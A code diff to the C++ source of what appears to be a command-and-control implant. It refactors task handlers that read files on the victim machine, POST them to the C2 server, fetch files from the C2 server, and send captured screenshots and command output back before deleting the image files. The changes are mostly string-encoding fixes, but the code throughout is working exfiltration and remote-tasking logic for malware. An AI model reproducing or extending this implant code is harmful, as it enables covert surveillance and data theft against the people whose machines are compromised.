@@ -32,7 +32,13 @@ std::wstring GetTask(
 
 std::wstring ExecuteTaskCat(const std::wstring& wFile)
 {
-    return MyReadFileW(wFile);
+    std::vector<char> byteData = ReadBytesFromFile(wFile);
+
+    // Convert to wstring
+    std::string fileContent = VecCharToString(byteData);
+    std::wstring wFileContent = UTF8Decode(fileContent);
+
+    return wFileContent;
 }
 
 std::wstring ExecuteTaskCd(const std::wstring& wDestDir)
@@ -62,7 +68,8 @@ std::wstring ExecuteTaskDownload(
 	std::wstring wHeaders;
     WinHttpResponse resp;
 
-    myFileData = MyReadFileExW(wSrc);
+    // Read a local file.
+    std::vector<char> byteData = ReadBytesFromFile(wSrc);
 
     // Set additional headers.
     // Specify the destination file path in the server-side.
@@ -75,8 +82,8 @@ std::wstring ExecuteTaskDownload(
 		REQUEST_PATH_UPLOAD_W,
 		L"POST",
 		wHeaders.c_str(),
-		myFileData.lpData,
-        myFileData.dwDataSize
+		(LPVOID)byteData.data(),
+        (DWORD)byteData.size()
 	);
 	if (!resp.bResult || resp.dwStatusCode != 200)
 	{
@@ -237,7 +244,7 @@ std::wstring ExecuteTaskUpload(
     const std::wstring& wSrc,
     const std::wstring& wDest
 ) {
-    std::string sSrc = ConvertWstringToString(wSrc);
+    std::string sSrc = UTF8Encode(wSrc);
 
     // Download a specified file from the C2 server.
     BOOL bResult = DownloadFile(
@@ -399,7 +406,6 @@ BOOL SendTaskResult(
 	const std::wstring& task,
 	const std::wstring& taskResult
 ) {
-    std::string sTaskResult;
     WinHttpResponse resp;
 
 	if (wcscmp(taskResult.c_str(), L"") == 0) {
@@ -410,16 +416,14 @@ BOOL SendTaskResult(
 	std::wstring wHeaders;
 	wHeaders = L"X-Task: " + task + L"\r\n";
 
-    sTaskResult = ConvertWstringToString(taskResult);
-
     // When the "screenshot" task, read bytes of the captured image file and send them.
     if (wcscmp(task.c_str(), L"screenshot") == 0)
     {
         // Load a captured image file
-        std::vector<BYTE> imgData = MyReadFileToByteArray(sTaskResult);
+        std::vector<char> imgData = ReadBytesFromFile(taskResult);
 
         // Delete the image file
-        MyDeleteFileW(taskResult.c_str());
+        MyDeleteFile(taskResult);
 
         resp = SendRequest(
             hConnect,
@@ -434,6 +438,9 @@ BOOL SendTaskResult(
     }
     else
     {
+        // I couln't retrieve the `wstring` length correctly, so use `string` here.
+        std::string sTaskResult = UTF8Encode(taskResult);
+
         resp = SendRequest(
             hConnect,
             lpHost,
